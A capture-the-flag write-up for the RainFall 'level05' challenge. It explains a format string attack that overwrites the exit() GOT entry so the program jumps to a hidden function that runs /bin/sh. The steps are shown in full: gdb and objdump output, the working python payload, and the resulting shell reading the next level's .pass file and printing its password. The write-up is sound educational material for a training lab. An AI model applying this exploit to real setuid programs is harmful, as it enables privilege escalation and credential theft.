# level05

The program wait for an input, and print the result:

```bash
level5@RainFall:~$ ./level5 
dsad
dsad
```

By looking at the code, we can see that the program call a function f, gets input from stdin with fgets and pass the result as only parameter printf.

With "info functions", we can see that another function "o" is not called. It contains a call of system with "/bin/sh" as parameter :

```gdb
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
```

With the "loop_address.py" script, we can found the Direct Access Parameter. We can also do it manually:

```bash
level5@RainFall:~$ (python -c 'print "AAAA" + " %x" * 10') | ./level5
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
```

We can see that our DAP is at 4th position. We need now to override the function call after `printf`. For this, we get the address of `exit` by looking at the Global Offset Table:

```bash
level5@RainFall:~$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

We can now override the value at 08049838 with a format string exploit. Our address to put is 0x080484a4. We substract 4 bytes, because we will print an address before:

```bash
(gdb) p/d 0x080484a4 - 4
$1 = 134513824
```

We try to exploit:

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"';cat) | ./level5
...
              200
whoami
level6
cd /home/user/level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
